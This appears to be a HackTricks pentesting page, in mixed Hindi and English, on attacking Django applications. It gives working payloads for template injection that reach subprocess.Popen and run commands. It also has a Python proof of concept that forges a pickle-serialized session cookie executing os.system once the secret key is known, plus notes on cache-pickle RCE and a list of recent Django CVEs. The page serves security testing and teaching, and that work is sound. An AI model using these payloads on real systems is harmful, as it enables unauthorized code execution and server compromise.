# Django

{{#include ../../banners/hacktricks-training.md}}

## Cache Manipulation to RCE
Django का डिफ़ॉल्ट cache स्टोरेज तरीका [Python pickles](https://docs.python.org/3/library/pickle.html) है, जो RCE का कारण बन सकता है अगर [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf)। **यदि कोई attacker cache पर write access प्राप्त कर लेता है, तो वे इस vulnerability को underlying server पर RCE में escalate कर सकते हैं**।

Django cache चार जगहों में से किसी एक में स्टोर होता है: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), या एक [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95)। Redis server या database में स्टोर किया गया cache सबसे संभावित attack vectors हैं (Redis injection और SQL injection), लेकिन attacker file-based cache का उपयोग करके भी arbitrary write को RCE में बदल सकता है। Maintainers ने इसे non-issue के रूप में mark किया है। ध्यान रहे कि cache file folder, SQL table name, और Redis server details implementation के अनुसार बदलेंगे।

This HackerOne report provides a great, reproducible example of exploiting Django cache stored in a SQLite database: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
The Django Template Language (DTL) is **Turing-complete**। यदि user-supplied data को *template string* के रूप में render किया जाता है (उदाहरण के लिए `Template(user_input).render()` कॉल करने पर या जब `|safe`/`format_html()` auto-escaping हटाते हैं), तो एक attacker पूर्ण SSTI → RCE हासिल कर सकता है।

### Detection
1. ऐसी dynamic calls ढूँढें जो `Template()` / `Engine.from_string()` / `render_to_string()` को कॉल कर रही हों और जिनमें *any* unsanitised request data शामिल हो।
2. एक time-based या arithmetic payload भेजें:
```django
{{7*7}}
```
यदि rendered output में `49` मौजूद है तो input template engine द्वारा compiled किया जा रहा है।

### RCE तक पहुँचने का तरीका
Django सीधे `__import__` तक access को ब्लॉक करता है, लेकिन Python object graph पहुँच योग्य है:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
`subprocess.Popen` का इंडेक्स ढूंढें (≈400–500, Python build पर निर्भर) और मनमाने कमांड निष्पादित करें:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
A safer universal gadget is to iterate until `cls.__name__ == 'Popen'`.

The same gadget works for **Debug Toolbar** or **Django-CMS** template rendering features that mishandle user input.

---

### Also see: ReportLab/xhtml2pdf PDF export RCE
Django पर बने applications आमतौर पर xhtml2pdf/ReportLab को views को PDF के रूप में export करने के लिए integrate करते हैं। जब user-controlled HTML PDF generation में जाता है, rl_safe_eval triple brackets `[[[ ... ]]]` के अंदर expressions को evaluate कर सकता है जिससे code execution संभव हो सकता है (CVE-2023-33733). विवरण, payloads, और mitigations:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

---

## Pickle-Backed Session Cookie RCE
यदि सेटिंग `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` सक्षम है (या कोई custom serializer जो pickle को deserialise करता है), Django *decrypts and unpickles* session cookie को किसी भी view को कॉल करने से **पहले** कर देता है। इसलिए, एक वैध signing key (project `SECRET_KEY` by default) का होना तुरंत remote code execution के लिए पर्याप्त है।

### Exploit Requirements
* The server uses `PickleSerializer`.
* The attacker knows / can guess `settings.SECRET_KEY` (leaks via GitHub, `.env`, error pages, etc.).

### Proof-of-Concept
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
Send the resulting cookie, and the payload runs with the permissions of the WSGI worker.

**रोकथाम**: Keep the default `JSONSerializer`, rotate `SECRET_KEY`, and configure `SESSION_COOKIE_HTTPONLY`.

---

## हाल के (2023-2025) उच्च-प्रभाव वाले Django CVEs जिन्हें Pentesters को जांचना चाहिए
* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (fixed June 4 2025). Attackers को log files में newlines/ANSI codes smuggle करने और downstream log analysis को poison करने की अनुमति देता है। Patch level ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Critical SQL injection* in `QuerySet.values()/values_list()` on `JSONField` (CVSS 9.8). JSON keys को craft करके quoting तोड़ने और arbitrary SQL execute करने का मार्ग मिलता है। Fixed in 4.2.15 / 5.0.8.

हमेशा सटीक framework version का fingerprint लें `X-Frame-Options` error page या `/static/admin/css/base.css` hash के माध्यम से और जहाँ लागू हो ऊपर वाले मुद्दों की जाँच करें।

---

## संदर्भ
* Django security release – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 4 Jun 2025.
* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 11 Aug 2024.
* 0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE and pivot into AD – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)

{{#include ../../banners/hacktricks-training.md}}
